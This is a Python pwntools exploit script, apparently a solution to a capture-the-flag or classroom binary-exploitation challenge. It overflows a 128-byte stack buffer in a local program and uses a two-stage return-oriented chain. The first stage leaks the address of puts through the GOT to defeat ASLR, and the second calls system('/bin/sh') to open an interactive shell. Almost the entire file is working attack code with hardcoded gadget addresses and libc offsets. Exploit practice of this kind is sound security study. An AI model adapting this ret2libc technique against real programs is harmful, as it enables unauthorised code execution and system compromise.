#!/usr/bin/env python3

from pwn import *
import binascii

DEBUG = False

scanf_buffer_size = 128
# via radare2 in sym.copy()
# add rsp, 0xffffffffffffff80
# 0x80 is 128


def int_to_address(i):
    # slice off '0x' and create bytearray:
    x = bytearray.fromhex(hex(i)[2:])
    # ensure correct length:
    while len(x) < 8:
        x = b"\x00" + x
    # return in reverse byte order:
    return x[::-1]


# addresses valid only with disabled aslr,
# these will be used to calculate the offset to libc:
system_call = b"\x00\x00\x7f\xff\xf7\xe1\xf8\x60"[::-1]
exit_call = b"\x00\x00\x7f\xff\xf7\xe1\x51\x00"[::-1]
bin_sh_string = b"\x00\x00\x7F\xFF\xF7\xF6\xE8\x82"[::-1]

# filler:
buffer = scanf_buffer_size * b"a"  # 0x61
backup_base_pointer = 8 * b"b"  # 0x62

# addresses valid with enabled aslr:
rop_pop_rdi_ret = b"\x00\x00\x00\x00\x00\x40\x12\x03"[::-1]
rop_puts = b"\x00\x00\x00\x00\x00\x40\x10\x30"[::-1]
double_pop_ret = b"\x00\x00\x00\x00\x00\x40\x12\x01"[::-1]
puts_got = b"\x00\x00\x00\x00\x00\x40\x3f\xc8"[::-1]
flush_got = b"\x00\x00\x00\x00\x00\x40\x3f\xd0"[::-1]
scanf_got = b"\x00\x00\x00\x00\x00\x40\x3f\xd8"[::-1]
copy_line4 = b"\x00\x00\x00\x00\x00\x40\x11\x46"[::-1]
main_line0 = b"\x00\x00\x00\x00\x00\x40\x11\x69"[::-1]


# this payload leaks the ASLR address of puts and restarts main:
payload1 = (
    buffer  # padding.
    + backup_base_pointer  # padding.
    + rop_pop_rdi_ret  # pops puts_got.
    + puts_got  # points to address affected by aslr.
    + rop_puts  # outputs address that puts_got points to.
    + main_line0  # restarts app for second payload.
)

p = process("./bin")

if DEBUG:
    raw_input(f"attach with gdb, then press enter:\ngdb -p {p.pid}")

r = p.recvuntil(b"Welcome student! Can you run /bin/sh\n")
print(r, "\n")

print("> sending first payload")
p.sendline(payload1)

leak = p.recvn(7)  # receive address of __GI__IO_puts plus line-feed.
leak = leak[::-1]  # reverse byte order for printing.
leak = leak[1:]  # slice off line-feed (0xa).

# e.g. leak: b'7ffff7e4be10
# x/i 0x7ffff7e4be10
# 0x7ffff7e4be10 <__GI__IO_puts>:      push   r14

print("puts leak:", binascii.b2a_hex(leak), end="")
print(" (check with gdb> x/i 0x... or gdb gef> got)")


#######
# calculated without aslr:
# gdb gef> info proc map
# 0x7ffff7dd6000     0x7ffff7dfc000    0x26000        0x0 /usr/lib/x86_64-linux-gnu/libc-2.33.so

# noaslr:
# leak:  b'7ffff7e4be10'
# offset to libc: 482832 0x75e10

libc_start_noaslr = 0x7FFFF7DD6000
offset_to_libc = 0x75E10
#######

# with aslr:
# leak - 0x75e10 -> libc start

leak = int.from_bytes(leak, byteorder="big", signed=False)
offset = leak - libc_start_noaslr

print("calculated offset:", hex(offset))
libc_start = leak - offset_to_libc

print("libc start:", hex(libc_start), end="")
print(" (compare with gdb> info proc map)")

#######
# calculated without aslr:

# bin_sh_offset = int.from_bytes(bin_sh_string, byteorder="little", signed=False) - libc_start
# system_offset = int.from_bytes(system_call, byteorder="little", signed=False) - libc_start
# exit_offset = int.from_bytes(exit_call, byteorder="little", signed=False) - libc_start

# print('/bin/sh offset from libc start:', hex(bin_sh_offset)) # 0x198882
# print('system() offset from libc start:', hex(system_offset)) # 0x49860
# print('exit_offset() offset from libc start:', hex(exit_offset)) # 0x3f100

# offsets from start of libc:
bin_sh_offset = 0x198882
system_offset = 0x49860
exit_offset = 0x3F100
#######

# calculate addresses as ints:
bin_sh_string = bin_sh_offset + libc_start
system_call = system_offset + libc_start
exit_call = exit_offset + libc_start

print("\ncalculated addresses:")
print("/bin/sh:", hex(bin_sh_string), "(gdb> x/s 0x...)")
print("system():", hex(system_call), "(gdb> x/i 0x...)")
print("exit():", hex(exit_call), "(gdb> x/i 0x...)")

r = p.recvuntil(b"Welcome student! Can you run /bin/sh\n")
print("\n", r, "\n", sep="")


# this payload uses the calculated offset to pop a shell:
payload2 = (
    buffer
    + backup_base_pointer
    + rop_pop_rdi_ret  # pop sh string into rdi.
    + int_to_address(bin_sh_string)  # aslr.
    + int_to_address(system_call)  # aslr.
    + int_to_address(exit_call)  # aslr.
)

print("> sending second payload")
p.sendline(payload2)

p.interactive()
